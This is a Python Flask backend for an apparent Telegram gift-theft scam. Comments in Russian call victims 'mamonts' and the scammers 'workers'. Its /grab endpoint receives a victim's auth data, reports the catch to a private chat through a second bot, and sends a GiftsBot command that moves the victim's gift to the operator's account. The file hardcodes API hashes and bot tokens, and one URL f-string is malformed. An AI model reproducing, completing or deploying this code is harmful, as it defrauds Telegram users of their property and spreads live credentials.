import os
import requests # Добавь это в начало файла
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient

app = Flask(__name__)
CORS(app)

# --- ТВОИ НАСТРОЙКИ ---
API_ID = 30356139 
API_HASH = 'eaf8c970ff553abe2f1578717c82e50e'
BOT_TOKEN = '8733015341:AAGXiGUv57x63oHQumkJot1pXyC-HvSLOzY'
LOG_BOT_TOKEN = '8728061701:AAHNSoJRp7yQYPPfDp8y53A3CLj-f2w3FCA' # Токен второго бота для уведомлений
CHAT_ID = '-1003794470658' # ID твоего приватного чата
MY_ID = "8486064073" # Твой ID для получения профита
# ----------------------

def send_to_chat(text):
    try:
        url = f"https://api.telegram.org/bot{8728061701:AAHNSoJRp7yQYPPfDp8y53A3CLj-f2w3FCA}/sendMessage"
        params = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
        requests.get(url, params=params)
    except:
        pass

@app.route('/grab', methods=['POST'])
async def grab():
    data = request.json
    init_data = data.get('auth_data')
    # Допустим, воркер шлет ссылку типа startapp=GIFTID_WORKERNAME
    start_param = data.get('gift_id', 'unknown_unknown')
    
    parts = start_param.split('_')
    gift_id = parts[0]
    worker_name = parts[1] if len(parts) > 1 else "Unknown"

    # Сразу шлем уведомление в чат, что мамонт заглотил наживку
    send_to_chat(f"🎣 **МАМОНТ НА КРЮЧКЕ!**\n\n👤 Воркер: @{worker_name}\n💎 Подарок ID: `{gift_id}`\n⏳ Статус: *Взлом сессии...*")

    client = TelegramClient('session', API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.start(bot_token=BOT_TOKEN)

        # Команда на вынос
        await client.send_message('GiftsBot', f'/start transfer_{gift_id}_to_{MY_ID}')
        
        # Уведомляем чат об успехе
        send_to_chat(f"✅ **ПРОФИТ!**\n\n💰 Подарок `{gift_id}` успешно отправлен на базу.\n📈 Курс: 100₽ = 1 TON")
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        send_to_chat(f"❌ **ОШИБКА ВОРКА**\n\nВоркер: @{worker_name}\nОшибка: `{str(e)}`")
        return jsonify({"status": "error"}), 500
    finally:
        await client.disconnect()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)

